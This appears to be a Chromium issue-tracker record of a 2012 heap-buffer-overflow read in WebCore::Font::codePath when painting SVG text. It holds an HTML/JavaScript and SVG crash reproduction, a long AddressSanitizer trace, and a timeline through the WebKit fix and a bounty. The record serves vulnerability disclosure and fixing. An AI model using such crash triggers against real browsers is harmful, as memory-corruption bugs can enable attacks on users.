# Heap-buffer-overflow in WebCore::Font::codePath

| Field | Value |
|-------|-------|
| **Issue ID** | [40053193](https://issues.chromium.org/issues/40053193) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink, Blink>SVG |
| **Reporter** | ax...@gmail.com |
| **Assignee** | pd...@chromium.org |
| **Created** | 2012-02-01 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

Heap buffer overflow happens when drawing text in SVG.

**VERSION**  

18.0.1024.0 (Developer Build 119669 Linux)  

Does not reproduce on 16.0.912.77 m, Win7 x64.

**REPRODUCTION CASE**

<script>
function go() {
q = document.getElementById('root').contentDocument;
r = document.createRange();
r.selectNodeContents( q.getElementById('t') );
window.getSelection().addRange(r)
document.designMode='on';
q.execCommand('delete');
q.execCommand('delete');
}
</script>

<object data="t.svg" id="root" onload="go()"/></object>

--- t.svg ---  

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">  

<g>  

<rect filter="url(#x)"/>  

<text>-2</text>  

<rect id="t"/>  

<style></style>  

<text>-2</text>  

</g>  

<filter id="x"></filter>  

</svg>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

==7067== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fbf741eb5a2 at pc 0x7fbf8987a71f bp 0x7fff2d8b69e0 sp 0x7fff2d8b69d8  

READ of size 2 at 0x7fbf741eb5a2 thread T0  

#0 0x7fbf8987a71f in WebCore::Font::codePath(WebCore::TextRun const&) const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/graphics/TextRun.h:99  

#1 0x7fbf8987a29d in WebCore::Font::drawText(WebCore::GraphicsContext\*, WebCore::TextRun const&, WebCore::FloatPoint const&, int, int) const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/graphics/Font.cpp:159  

#2 0x7fbf8b0f3655 in WebCore::InlineBox::parent() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/InlineBox.h:209  

#3 0x7fbf8b0f14cc in WebCore::SVGInlineTextBox::paintText(WebCore::GraphicsContext\*, WebCore::RenderStyle\*, WebCore::RenderStyle\*, WebCore::SVGTextFragment const&, bool, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/svg/SVGInlineTextBox.cpp:675  

#4 0x7fbf8b0f0b50 in WebCore::SVGInlineTextBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&, int, int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/svg/SVGInlineTextBox.cpp:312  

#5 0x7fbf8b1142ea in WebCore::InlineBox::nextOnLine() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/InlineBox.h:185  

#6 0x7fbf8a864f9e in WebCore::InlineFlowBox::nextLineBox() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/InlineFlowBox.h:73  

#7 0x7fbf8a6c8440 in WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, WebCore::IntPoint const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2571  

#8 0x7fbf8a6c9a36 in WebCore::RenderObject::document() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderObject.h:550  

#9 0x7fbf8a6c4c58 in WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2427  

#10 0x7fbf8b0e9be4 in ~GraphicsContextStateSaver /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/graphics/GraphicsContext.h:564  

#11 0x7fbf8b442933 in WebCore::RenderObject::nextSibling() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderObject.h:144  

#12 0x7fbf8a74f1c7 in WebCore::RenderObject::nextSibling() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderObject.h:144  

#13 0x7fbf8b0e5844 in WebCore::RenderSVGRoot::paintReplaced(WebCore::PaintInfo&, WebCore::IntPoint const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/svg/RenderSVGRoot.cpp:264  

#14 0x7fbf8a8c309d in WebCore::RenderReplaced::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderReplaced.cpp:152  

#15 0x7fbf8a824c22 in WebCore::RenderLayer::paintLayerContents(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2919  

#16 0x7fbf8a82205a in WebCore::RenderLayer::paintLayer(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2801  

#17 0x7fbf8a8254ab in WebCore::RenderLayer::paintList(WTF::Vector<WebCore::RenderLayer\*, 0ul>\*, WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2983  

#18 0x7fbf8a82205a in WebCore::RenderLayer::paintLayer(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2801  

#19 0x7fbf8a820ba7 in WebCore::RenderLayer::paint(WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, unsigned int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2617  

#20 0x7fbf8a1b1915 in WebCore::RenderLayer::containsDirtyOverlayScrollbars() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderLayer.h:557  

#21 0x7fbf89822d76 in ~GraphicsContextStateSaver /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/graphics/GraphicsContext.h:564  

#22 0x7fbf8a97306e in WebCore::RenderWidget::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderWidget.cpp:290  

#23 0x7fbf8a664d14 in WebCore::InlineBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&, int, int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/InlineBox.cpp:231  

#24 0x7fbf8a677635 in WebCore::InlineBox::nextOnLine() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/InlineBox.h:185  

#25 0x7fbf8a979001 in WebCore::RootInlineBox::hasEllipsisBox() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RootInlineBox.h:95  

#26 0x7fbf8a864f9e in WebCore::InlineFlowBox::nextLineBox() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/InlineFlowBox.h:73  

#27 0x7fbf8a6c8440 in WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, WebCore::IntPoint const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2571  

#28 0x7fbf8a6c9a36 in WebCore::RenderObject::document() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderObject.h:550  

#29 0x7fbf8a6c4c58 in WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2427  

#30 0x7fbf8a6c8d13 in WebCore::RenderObject::RenderObjectBitfields::childrenInline() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderObject.h:979  

#31 0x7fbf8a6c8450 in WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, WebCore::IntPoint const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2574  

#32 0x7fbf8a6c9a36 in WebCore::RenderObject::document() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderObject.h:550  

#33 0x7fbf8a6c4c58 in WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2427  

#34 0x7fbf8a824c22 in WebCore::RenderLayer::paintLayerContents(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2919  

#35 0x7fbf8a82205a in WebCore::RenderLayer::paintLayer(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2801  

#36 0x7fbf8a8254ab in WebCore::RenderLayer::paintList(WTF::Vector<WebCore::RenderLayer\*, 0ul>\*, WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2983  

#37 0x7fbf8a82205a in WebCore::RenderLayer::paintLayer(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2801  

#38 0x7fbf8a820ba7 in WebCore::RenderLayer::paint(WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, unsigned int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2617  

#39 0x7fbf8a1b1915 in WebCore::RenderLayer::containsDirtyOverlayScrollbars() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderLayer.h:557  

#40 0x7fbf89822d76 in ~GraphicsContextStateSaver /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/graphics/GraphicsContext.h:564  

#41 0x7fbf88df77b7 in WebKit::WebFrameImpl::paintWithContext(WebCore::GraphicsContext&, WebKit::WebRect const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebKit/chromium/src/WebFrameImpl.cpp:2084  

#42 0x7fbf88df7b11 in ~GraphicsContextBuilder /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebKit/chromium/src/painting/GraphicsContextBuilder.h:63  

#43 0x7fbf88e3a701 in WebKit::WebViewImpl::paint(SkCanvas\*, WebKit::WebRect const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebKit/chromium/src/WebViewImpl.cpp:1240  

#44 0x7fbf8c2fd6e4 in RenderWidget::PaintRect(gfx::Rect const&, gfx::Point const&, skia::PlatformCanvas\*) /media/Chromium/chromium/depot\_tools/src/content/renderer/render\_widget.cc:617  

#45 0x7fbf8c301b40 in std::vector<gfx::Rect, std::allocator[gfx::Rect](javascript:void(0);) >::size() const /usr/lib/gcc/x86\_64-linux-gnu/4.4/../../../../include/c++/4.4/bits/stl\_vector.h:533  

#46 0x7fbf8c2f6f38 in scoped\_ptr[IPC::Message](javascript:void(0);)::get() const /media/Chromium/chromium/depot\_tools/src/./base/memory/scoped\_ptr.h:175  

#47 0x7fbf8c2f5aa9 in bool IPC::Message::Dispatch<RenderWidget, RenderWidget>(IPC::Message const\*, RenderWidget\*, RenderWidget\*, void (RenderWidget::\*)()) /media/Chromium/chromium/depot\_tools/src/./ipc/ipc\_message.h:137  

#48 0x7fbf8c2a2b2a in RenderViewImpl::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/render\_view\_impl.cc:764  

#49 0x7fbf88d0f288 in MessageRouter::RouteMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/message\_router.cc:46  

#50 0x7fbf88d0f0f0 in MessageRouter::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/message\_router.cc:39  

#51 0x7fbf88c35b60 in ChildThread::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/child\_thread.cc:202  

#52 0x7fbf88d84cc9 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_proxy.cc:263  

#53 0x7fbf875b44a6 in base::Callback<void ()()>::Run() const /media/Chromium/chromium/depot\_tools/src/./base/callback.h:272  

#54 0x7fbf875b4d08 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:470  

#55 0x7fbf875b5ff9 in MessageLoop::DoWork() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:660  

#56 0x7fbf875c0b27 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_default.cc:28  

#57 0x7fbf875b303e in MessageLoop::RunInternal() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:418  

BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug\_str size (80989744).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (55251802).  

BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug\_str size (80989744).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (55251802).  

BFD: Dwarf Error: Offset (1949266029) greater than or equal to .debug\_str size (80989744).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (55251802).  

BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug\_str size (80989744).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (55251802).  

BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug\_str size (80989744).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (55251802).  

#58 0x7fbf875b122f in ~AutoRunState /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:745  

#59 0x7fbf8c31dece in RendererMain(content::MainFunctionParams const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/renderer\_main.cc:241  

#60 0x7fbf8750c898 in RunZygote /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:233  

#61 0x7fbf8750bcf2 in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:457  

#62 0x7fbf85c52bc7 in ChromeMain /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_main.cc:32  

#63 0x7fbf85c52acb in main /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_exe\_main\_gtk.cc:18  

0x7fbf741eb5a2 is located 0 bytes to the right of 34-byte region [0x7fbf741eb580,0x7fbf741eb5a2)  

allocated by thread T0 here:  

#0 0x7fbf8d570292 in malloc ??:0  

#1 0x7fbf88f0e71b in WTF::fastMalloc(unsigned long) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/FastMalloc.cpp:268  

#2 0x7fbf88f2c354 in WTF::StringImpl::createUninitialized(unsigned int, unsigned short\*&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/text/StringImpl.cpp:110  

#3 0x7fbf88f3fb67 in WTF::PassRefPtr[WTF::StringImpl](javascript:void(0);)::leakRef() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:161  

#4 0x7fbf894e557d in WebCore::CharacterData::deleteData(unsigned int, unsigned int, int&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/CharacterData.cpp:129  

#5 0x7fbf8a44f1ff in WebCore::DeleteFromTextNodeCommand::doApply() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/DeleteFromTextNodeCommand.cpp:63  

#6 0x7fbf8a42243f in WebCore::CompositeEditCommand::applyCommandToComposite(WTF::PassRefPtr[WebCore::EditCommand](javascript:void(0);)) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/CompositeEditCommand.cpp:256  

#7 0x7fbf8a42aa6b in ~PassRefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:67  

#8 0x7fbf8a45e870 in ~PassRefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:67  

#9 0x7fbf8a45f337 in WebCore::DeleteSelectionCommand::handleGeneralDelete() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/DeleteSelectionCommand.cpp:443  

#10 0x7fbf8a46bf12 in WebCore::DeleteSelectionCommand::doApply() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/DeleteSelectionCommand.cpp:823  

#11 0x7fbf8a42243f in WebCore::CompositeEditCommand::applyCommandToComposite(WTF::PassRefPtr[WebCore::EditCommand](javascript:void(0);)) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/CompositeEditCommand.cpp:256  

#12 0x7fbf8a42ec4f in ~PassRefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:67  

#13 0x7fbf89e66a43 in WebCore::TypingCommand::setSmartDelete(bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/TypingCommand.h:94  

#14 0x7fbf89e62f60 in void WTF::derefIfNotNull[WebCore::TypingCommand](javascript:void(0);)(WebCore::TypingCommand\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:52  

#15 0x7fbf89d9af05 in WebCore::executeDelete(WebCore::Frame\*, WebCore::Event\*, WebCore::EditorCommandSource, WTF::String const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/EditorCommand.cpp:321  

#16 0x7fbf89d99701 in WebCore::Editor::Command::execute(WTF::String const&, WebCore::Event\*) const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/EditorCommand.cpp:1665  

#17 0x7fbf893ce786 in WebCore::Document::execCommand(WTF::String const&, bool, WTF::String const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:4174  

#18 0x7fbf8ae6114b in WebCore::DocumentInternal::execCommandCallback(v8::Arguments const&) /media/Chromium/chromium/depot\_tools/src/out/Release/obj/gen/webcore/bindings/V8Document.cpp:1503  

#19 0x7fbf882dc0c3 in HandleApiCallHelper /media/Chromium/chromium/depot\_tools/src/v8/src/builtins.cc:1220  

#20 0x3ea42e80420e  

#21 0x3ea42e83089a  

==7067== ABORTING  

Stats: 13M malloced (14M for red zones) by 44093 calls  

Stats: 2M realloced by 2067 calls  

Stats: 11M freed by 33236 calls  

Stats: 0M really freed by 0 calls  

Stats: 60M (15369 full pages) mmaped in 15 calls  

mmaps by size class: 8:49149; 9:8191; 10:4095; 11:2047; 12:1024; 13:512; 14:256; 15:128; 16:64; 17:32; 18:16; 19:8; 21:2;  

mallocs by size class: 8:35812; 9:4615; 10:2070; 11:775; 12:339; 13:253; 14:157; 15:39; 16:15; 17:12; 18:2; 19:3; 21:1;  

frees by size class: 8:26153; 9:4031; 10:1785; 11:566; 12:279; 13:226; 14:143; 15:32; 16:8; 17:7; 18:2; 19:3; 21:1;  

rfrees by size class:  

Stats: malloc large: 18 small slow: 193  

Shadow byte and word:  

0x1ff7ee83d6b4: 2  

0x1ff7ee83d6b0: 00 00 00 00 02 fb fb fb  

More shadow bytes:  

0x1ff7ee83d690: 00 00 00 00 06 fb fb fb  

0x1ff7ee83d698: fb fb fb fb fb fb fb fb  

0x1ff7ee83d6a0: fa fa fa fa fa fa fa fa  

0x1ff7ee83d6a8: fa fa fa fa fa fa fa fa  

=>0x1ff7ee83d6b0: 00 00 00 00 02 fb fb fb  

0x1ff7ee83d6b8: fb fb fb fb fb fb fb fb  

0x1ff7ee83d6c0: fa fa fa fa fa fa fa fa  

0x1ff7ee83d6c8: fa fa fa fa fa fa fa fa  

0x1ff7ee83d6d0: fd fd fd fd fd fd fd fd

## Attachments

- [testCrash.html](attachments/testCrash.html) (text/html; charset=us-ascii, 659 B)

## Timeline

### in...@chromium.org (2012-02-02)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=17452193

Uploader: inferno@chromium.org

Crash Type: Heap-buffer-overflow READ 2
Crash Address: 0x7f9d327487a2
Crash State:
  - crash stack -
  WebCore::Font::codePath
  WebCore::Font::drawText
  WebCore::SVGInlineTextBox::paintTextWithShadows
  

Minimized Testcase (0.53 Kb): https://cluster-fuzz.appspot.com/download/AMIfv95n8ULm6OEr_Um79wRwOGmcYNJxHxkovAIu2xVWJB7zdynKveLwx-NXBZ2Pev6VYcF_JPDcPnJz5AQ0zDq7-AX5XHmS17qak6iM7yTImrsCEY8eK2dzJwFAy5nvBFP8A9iz6-8WOzw_kPPgANElpDEnX6jvRg

### in...@chromium.org (2012-02-02)

[Empty comment from Monorail migration]

### js...@chromium.org (2012-02-05)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-02-06)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-02-16)

Assigning to pdr.

### in...@chromium.org (2012-03-06)

Philip, friendly ping!

### in...@chromium.org (2012-03-06)

We don't want to ship with this bug in m18 (like 2 more weeks), so it will be awesome to get this knocked off.

### sc...@gmail.com (2012-03-06)

@inferno, don't forget to set Mstone-18 :)

@pdr @inferno @schenney: the effective M18 deadline for fixing and merging is probably just one week. Please ring alarm bells if no-one can get to it in that time so that we can hunt wider for owners.

### sc...@chromium.org (2012-03-06)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-03-06)

Add pdr to CC list

### sc...@gmail.com (2012-03-07)

[Empty comment from Monorail migration]

### pd...@chromium.org (2012-03-09)

Attached is a cleaned up version of the crasher.

### sc...@chromium.org (2012-03-09)

Upstream: https://bugs.webkit.org/show_bug.cgi?id=80729

### pd...@chromium.org (2012-03-12)

Stephen and I looked into this over the weekend and we have what we think is a fix in the works. I'll keep this bug updated.

### sc...@chromium.org (2012-03-12)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-13)

cc: kareng
Thanks guys. The M18 merge deadline was actually tonight but I think we just got a day extension to look into a few regressions, etc.
Ideally there would be some simple / safe fix for this that we could uptake to the M18 branch?

### pd...@chromium.org (2012-03-13)

Just an update: simple/safe fix patch is pending in WebKit. Waiting on Nikolas Zimmerman (original author that caused this issue) to get back from lunch to review it.

I suspect this will land cleanly in WebKitLand, and we'll be good to do the Chromium roll.

### sc...@gmail.com (2012-03-13)

Wonderful! I'll look at it and merge it later this afternoon, assuming we've managed to land it to WebKit trunk.

### in...@chromium.org (2012-03-13)

http://trac.webkit.org/changeset/110593

### pd...@chromium.org (2012-03-13)

Yes! We landed and bots are looking happy. I think this is a closed case, assuming the Chromium WebKit roll goes well.

### sc...@gmail.com (2012-03-13)

I'll merge it in a bit if I don't hear anything.

### sc...@gmail.com (2012-03-14)

M18: http://trac.webkit.org/changeset/110658

### sc...@gmail.com (2012-03-14)

Thanks! OOB read involving text. We reward these at $500 on the possibility that some OOB bytes might be recoverable by Javascript.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-03-25)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-05-10)

Payment in system (part of a $6000 batch)

### sc...@gmail.com (2012-05-10)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### la...@google.com (2013-01-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/112317?no_tracker_redirect=1

[Multiple monorail components: Blink, Blink>SVG]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053193)*
